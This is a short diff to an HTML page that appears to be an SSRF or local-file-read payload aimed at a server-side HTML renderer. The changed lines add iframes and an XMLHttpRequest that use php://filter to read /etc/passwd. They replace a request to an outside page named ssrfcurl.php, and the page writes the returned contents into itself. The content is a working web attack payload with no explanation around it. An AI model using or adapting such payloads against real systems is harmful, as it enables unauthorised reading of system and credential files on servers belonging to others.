@@ -13,8 +13,8 @@
     <iframe src="file://main.py" width="400" height="400"></iframe>
     <iframe src="file://__pycache__" width="400" height="400"></iframe>
     <iframe src="file://__init__.py" width="400" height="400"></iframe>
-    <iframe src="file://../__init__.py" width="400" height="400"></iframe>
-    <iframe src="file://../../__init__.py" width="400" height="400"></iframe>
+    <iframe src="php://filter/string.strip_tags/resource=/etc/passwd" width="400" height="400"></iframe>
+    <iframe src="data:" width="400" height="400"></iframe>
        
        
     <script>
@@ -22,7 +22,7 @@
         x.onload=function(){
         document.write(this.responseText)
         };
-        x.open("GET","https://anyquestions69.github.io/ssrfcurl.php");
+        x.open("GET","php://filter/string.strip_tags/resource=/etc/passwd");
         x.send();
         console.log(window)
         </script>
